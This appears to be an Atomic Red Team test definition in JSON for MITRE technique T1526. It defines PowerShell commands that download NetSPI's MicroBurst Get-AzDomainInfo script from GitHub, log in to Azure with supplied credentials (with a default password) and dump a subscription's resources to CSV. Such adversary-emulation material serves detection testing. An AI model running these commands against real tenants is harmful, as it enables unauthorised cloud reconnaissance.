{
    "name": "Azure - Dump Subscription Data with MicroBurst",
    "description": "Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription.  The resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script.  See https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1 ",
    "supported_platforms": [
        "iaas:azure"
    ],
    "dependency_executor_name": "powershell",
    "executor": {
        "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential | out-null\nGet-AzDomainInfo -folder #{output_directory} -subscription \"#{subscription_name}\" -verbose\n",
        "cleanup_command": "remove-item #{output_directory} -recurse -force -erroraction silentlycontinue\n",
        "name": "powershell",
        "type": "Command Executor"
    },
    "id": "T1526",
    "tactics": [
        "Discovery"
    ],
    "technique": "Cloud Service Discovery",
    "source": "ART",
    "uuid": "1e40bb1d-195e-401e-a86b-c192f55e005c",
    "arguments": {
        "username": {
            "description": "Azure AD username",
            "type": "string",
            "default": null
        },
        "password": {
            "description": "Azure AD password",
            "type": "string",
            "default": "T1082Az"
        },
        "output_directory": {
            "description": "Directory to output results to",
            "type": "string",
            "default": "$env:temp\\T1526Test1"
        },
        "subscription_name": {
            "description": "Azure subscription name to scan",
            "type": "string",
            "default": null
        }
    },
    "preconditions": [
        {
            "description": "The Get-AzDomainInfo script must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
            "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"){exit 0} else {exit 1}\n",
            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n"
        },
        {
            "description": "The Az module must be installed.\n",
            "prereq_command": "try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
            "get_prereq_command": "Install-Module -Name Az -Force\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim"
}